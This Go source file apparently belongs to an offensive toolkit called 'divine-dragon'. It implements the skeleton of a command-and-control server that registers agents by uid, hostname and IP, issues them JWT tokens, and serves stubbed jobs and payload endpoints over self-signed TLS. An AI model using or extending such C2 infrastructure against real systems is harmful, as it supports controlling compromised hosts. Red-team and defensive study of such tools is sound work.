package transport

import (
	"divine-dragon/util"
	"fmt"
	"io"
	"net"
	"os"
	"time"

	jwt "github.com/appleboy/gin-jwt/v2"
	"github.com/gin-gonic/gin"
)

type C2Server struct {
	host         string
	port         string
	r            *gin.Engine
	identityKey  string
	activeAgents []Agent
	agentJobs    map[string]Job
}

type connectAgent struct {
	Uid      string `form:"uid" json:"uid" binding:"required"`
	Hostname string `form:"hostname" json:"hostname" binding:"required"`
	Ip       string `form:"ip" json:"ip" binding:"required"`
}

type Agent struct {
	Uid      string
	Hostname string
	Ip       string
}

type Job struct {
	queue []string
}

func NewC2Server(hostOpt, portOpt string) (*C2Server, error) {
	c2s := C2Server{
		host: hostOpt,
		port: portOpt,
	}
	gin.SetMode(gin.ReleaseMode)
	gin.DisableConsoleColor()
	c2Log, _ := os.Create("data/c2/c2.log")
	gin.DefaultWriter = io.MultiWriter(c2Log)
	r, err := c2s.setupRouter()
	if err != nil {
		return nil, err
	}
	c2s.r = r
	return &c2s, nil
}

func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
	r := gin.Default()
	authMiddleware, err := c2s.initJWTMiddleware()
	if err != nil {
		return nil, err
	}

	r.POST("/connect", authMiddleware.LoginHandler)

	r.NoRoute(authMiddleware.MiddlewareFunc(), func(c *gin.Context) {
		c.JSON(404, gin.H{"code": "PAGE_NOT_FOUND", "message": "Page not found"})
	})

	auth := r.Group("/agent")
	auth.GET("/refresh_token", authMiddleware.RefreshHandler)
	auth.Use(authMiddleware.MiddlewareFunc())
	{
		auth.GET("/jobs", c2s.jobsHandler)
		auth.GET("/payload", c2s.payloadHandler)
	}
	return r, nil
}

func (c2s *C2Server) initJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
	c2s.identityKey = "Uid"
	secret := util.RandString(256)
	authMiddleware, err := jwt.New(&jwt.GinJWTMiddleware{
		Realm:       "C2",
		Key:         []byte(secret),
		Timeout:     time.Hour,
		MaxRefresh:  time.Hour,
		IdentityKey: c2s.identityKey,
		PayloadFunc: func(data interface{}) jwt.MapClaims {
			if v, ok := data.(*Agent); ok {
				return jwt.MapClaims{
					c2s.identityKey: v.Uid,
				}
			}
			return jwt.MapClaims{}
		},
		IdentityHandler: func(c *gin.Context) interface{} {
			claims := jwt.ExtractClaims(c)
			for _, agent := range c2s.activeAgents {
				if agent.Uid == claims[c2s.identityKey].(string) {
					return &agent
				}
			}
			return nil
		},
		Authenticator: func(c *gin.Context) (interface{}, error) {
			var connectAgentVars connectAgent
			if err := c.ShouldBind(&connectAgentVars); err != nil {
				return "", jwt.ErrMissingLoginValues
			}
			uid := connectAgentVars.Uid
			hostname := connectAgentVars.Hostname
			ip := connectAgentVars.Ip

			if len(uid) == 16 && len(hostname) < 16 && net.ParseIP(ip) != nil {
				newAgent := Agent{
					Uid:      uid,
					Hostname: hostname,
					Ip:       ip,
				}
				c2s.activeAgents = append(c2s.activeAgents, newAgent)
				return &newAgent, nil
			}

			return nil, jwt.ErrFailedAuthentication
		},
		Authorizator: func(data interface{}, c *gin.Context) bool {
			v, ok := data.(*Agent)
			if ok {
				for _, agent := range c2s.activeAgents {
					if v.Uid == agent.Uid {
						return true
					}
				}
				return false
			}
			return false
		},
		Unauthorized: func(c *gin.Context, code int, message string) {
			c.JSON(code, gin.H{
				"code":    code,
				"message": message,
			})
		},
		TokenLookup:   "header: Authorization, query: token, cookie: jwt",
		TokenHeadName: "Bearer",

		// TimeFunc provides the current time. You can override it to use another time value. This is useful for testing or if your server uses a different time zone than your tokens.
		TimeFunc: time.Now,
	})
	if err != nil {
		return nil, fmt.Errorf("can't initialize a middleware: %v", err)
	}
	return authMiddleware, nil
}

func (c2s *C2Server) jobsHandler(c *gin.Context) {
	claims := jwt.ExtractClaims(c)
	agent, _ := c.Get(c2s.identityKey)
	c.JSON(200, gin.H{
		"uid":      claims[c2s.identityKey],
		"hostname": agent.(*Agent).Hostname,
		"ip":       agent.(*Agent).Ip,
	})
}

func (c2s *C2Server) payloadHandler(c *gin.Context) {
	claims := jwt.ExtractClaims(c)
	agent, _ := c.Get(c2s.identityKey)
	c.JSON(200, gin.H{
		"uid":      claims[c2s.identityKey],
		"hostname": agent.(*Agent).Hostname,
		"ip":       agent.(*Agent).Ip,
	})
}

func (c2s *C2Server) Run() error {
	ca, err := util.NewRootCertificateAuthority()
	if err != nil {
		return fmt.Errorf("can't create a new CA: %v", err)
	}
	err = ca.CreateTLSCert(c2s.host)
	if err != nil {
		return fmt.Errorf("can't generate a TLS cert: %v", err)
	}
	err = ca.DumpAll()
	if err != nil {
		return fmt.Errorf("can't dump certs and keys to a folder: %v", err)
	}
	err = c2s.r.RunTLS(c2s.host+":"+c2s.port, "data/c2/"+c2s.host+".crt", "data/c2/"+c2s.host+".key")
	if err != nil {
		return fmt.Errorf("can't start an HTTP server: %v", err)
	}
	return nil
}
